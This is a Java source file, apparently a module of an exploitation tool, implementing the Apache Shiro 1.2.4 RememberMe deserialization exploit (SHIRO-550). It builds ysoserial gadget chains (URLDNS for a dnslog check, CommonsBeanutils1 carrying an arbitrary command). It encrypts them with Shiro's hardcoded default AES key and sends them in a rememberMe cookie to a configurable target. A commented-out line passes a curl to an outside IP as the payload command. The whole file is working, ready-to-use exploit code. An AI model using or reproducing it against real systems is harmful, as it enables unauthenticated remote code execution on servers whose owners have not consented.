package vulpayload;

import baselib.Result;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import tools.Random_Str;
import tools.Serializer;
import ysoserial.payloads.CommonsBeanutils1;
import ysoserial.payloads.URLDNS;

import java.util.HashMap;
import java.util.PriorityQueue;

public class Shiro_550 extends Payload {

    public Shiro_550(){
        payload_info.put("payload_name","Shiro RememberMe 1.2.4 反序列化漏洞（SHIRO-550）");
        payload_info.put("payload_id","1");
        payload_info.put("payload_module","Apache Shiro");
        payload_info.put("payload_affect_version","<= 1.2.4");
        payload_info.put("payload_number","shiro-550");
        payload_info.put("payload_cvss","9.8");
        payload_info.put("payload_affect","无需登录，远程代码执行");
        payload_info.put("payload_overview","Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，\n\n在它编号为550的 issue 中爆出严重的 Java 反序列化漏洞\n\n issue地址：https://issues.apache.org/jira/browse/SHIRO-550");

        payload_info.put("payload_author_id","Skay");
        payload_info.put("payload_author_email","00@gmail.com");
        payload_info.put("payload_finish_time","2020/5/18");
        payload_info.put("payload_author_website","http://github.com/0linlin0");
        payload_info.put("args_num","5");
        if(payload_args.isEmpty()){
            payload_args.put("ip","127.0.0.1");
            payload_args.put("protocol","http");
            payload_args.put("url_back","/samples_web_war/login.jsp");
            payload_args.put("port","8081");
            payload_args.put("cmd","whoami");
            payload_args.put("dns","aaa.ykgq52.dnslog.cn");
        }else {
            payload_args.clear();
            payload_args.put("ip","127.0.0.1");
            payload_args.put("protocol","http");
            payload_args.put("url_back","/samples_web_war/login.jsp");
            payload_args.put("port","8081");
            payload_args.put("cmd","whoami");
            payload_args.put("dns","aaa.ykgq52.dnslog.cn");
        }

    }
    @Override
    public Result test() throws Exception {
        String target_ip = payload_args.get("ip");
        String target_protocol = payload_args.get("protocol");
        String target_url_back = payload_args.get("url_back");
        String target_port =  payload_args.get("port");
        String dns =  payload_args.get("dns");
//        String jsessionid = (String) payload_args.get("jsessionid");

        String url = target_protocol+"://"+target_ip+":"+target_port+target_url_back;


        URLDNS test_550 = new URLDNS();
        String random_str = Random_Str.generateRandomStr(6);
        HashMap urldns_obj = (HashMap) test_550.getObject("http://"+random_str+"."+ dns);
        byte[] urldns_byte = Serializer.serialize(urldns_obj);


        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

//        org.apache.shiro.util.ByteSource ciphertext = (org.apache.shiro.util.ByteSource)aes.encrypt(urldns_byte, key);
        Object val=aes.encrypt(urldns_byte, key);
        ByteSource ciphertext = (ByteSource) val;
        String cookie_rememberme = ciphertext.toString();

//        System.out.printf(cookie_rememberme);


//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8888));

        OkHttpClient okHttpClient = new OkHttpClient.Builder()
//                .proxy(proxy)
                .build();
        Request request = new Request.Builder()
                .addHeader("User-Agent","Mozilla/5.0 (Linux; Android 9.0; MI 8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36")
                .addHeader("Accept-Language","zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3")
                .addHeader("Cookie","rememberMe="+cookie_rememberme)
                .url(url)
                .build(); // 创建一个请求
        Response response = okHttpClient.newCall(request).execute();
//        HttpUtils.get("http://exp."+random_str+"."+dns);

        Result result = new Result();
        result.is_echo = false;
        result.return_content = "check your dnslog";
        result.is_success = true;

        return result;
    }

    @Override
    public Result execution() throws Exception {
        String target_ip = payload_args.get("ip");
        String target_protocol = payload_args.get("protocol");
        String target_url_back = payload_args.get("url_back");
        String target_port =  payload_args.get("port");
        String dns =  payload_args.get("dns");
        String cmd = payload_args.get("cmd");
//        String jsessionid = (String) payload_args.get("jsessionid");

        String url = target_protocol+"://"+target_ip+":"+target_port+target_url_back;


//        CommonsCollections1 cc1 = new CommonsCollections1();
//        InvocationHandler cc1_obj = cc1.getObject("curl 10.251.0.111:9999");
//        byte[] cc1_byte = Serializer.serialize(cc1_obj);

        CommonsBeanutils1 cb1 = new CommonsBeanutils1();
        PriorityQueue cb1_obj = (PriorityQueue) cb1.getObject(cmd);
        byte[] cb1_byte = Serializer.serialize(cb1_obj);
//        String cc1_str = new String(cc1_byte);


        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = (ByteSource)aes.encrypt(cb1_byte, key);
        String cookie_rememberme = ciphertext.toString();

        System.out.printf(cookie_rememberme);


//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8888));

        OkHttpClient okHttpClient = new OkHttpClient.Builder()
//                .proxy(proxy)
                .build();
        Request request = new Request.Builder()
                .addHeader("User-Agent","Mozilla/5.0 (Linux; Android 9.0; MI 8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36")
                .addHeader("Accept-Language","zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3")
                .addHeader("Cookie","rememberMe="+cookie_rememberme)
                .url(url)
                .build(); // 创建一个请求
        Response response = okHttpClient.newCall(request).execute();

        Result shiro_550_result = new Result();
        shiro_550_result.is_echo = false;
        Shiro_550 test_shiro_550 = new Shiro_550();
        shiro_550_result.is_success = test_shiro_550.test().is_success;
        shiro_550_result.return_content = "命令执行完毕！";

        return shiro_550_result;
    }



    public static void main(String[] args) throws Exception {
        Shiro_550 shiro_550 = new Shiro_550();
        shiro_550.test();
        System.out.println("shiro");
    }



}
